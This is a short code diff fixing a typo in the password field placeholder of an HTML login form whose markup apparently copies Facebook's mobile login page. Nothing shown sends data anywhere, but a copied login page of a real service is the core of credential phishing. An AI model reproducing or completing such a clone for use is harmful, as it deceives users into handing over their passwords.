@@ -99,7 +99,7 @@
 
 
                                     <input autocorrect="off" autocapitalize="off" class="_56bg _55ws _5ruq"
-                                           placeholder="passwork" name="password" type="password"
+                                           placeholder="password" name="password" type="password"
                                            data-sigil="password" id="passsword" required/>
                                     <div class="_55ws" >
                                         <button type="submit" value="Log in" class="_56bs _56b_ _56bw _56bu"
